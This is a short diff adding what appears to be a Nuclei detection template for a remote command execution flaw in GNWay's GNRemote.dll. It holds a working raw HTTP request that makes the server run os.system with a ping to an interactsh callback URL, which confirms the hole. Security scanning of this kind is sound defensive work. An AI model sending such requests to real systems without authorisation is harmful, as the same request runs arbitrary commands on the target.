@@ -1,0 +1,26 @@
+id: poc-yaml-gnway-gnremote-pyargu-rce
+info:
+  name: GNWay GNRemote.dll RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, command-injection
+  description: |
+    Exploits an RCE vulnerability in the GNWay GNRemote.dll component by leveraging command injection via Python function calls.
+
+http:
+  - raw:
+      - |
+        GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=ping+-nc+2+{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - "ping"
